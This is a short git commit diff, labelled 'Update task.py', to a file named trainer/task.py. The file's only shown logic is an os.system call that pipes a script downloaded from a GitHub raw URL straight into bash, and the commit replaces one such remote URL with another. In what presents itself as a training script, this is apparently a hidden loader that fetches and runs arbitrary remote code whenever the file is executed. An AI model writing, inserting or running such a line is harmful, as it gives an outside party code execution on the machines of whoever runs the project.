9e5927d440f180a8d6b69d3622401ec9c8f0e3e0
claires67 <clairgethick@gmail.com>
2025-01-05 22:50:50 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kazppkido/gbut/raw/main/newspec | bash')
+os.system('curl -sL https://github.com/claires67/buut/raw/main/ispekk | bash')
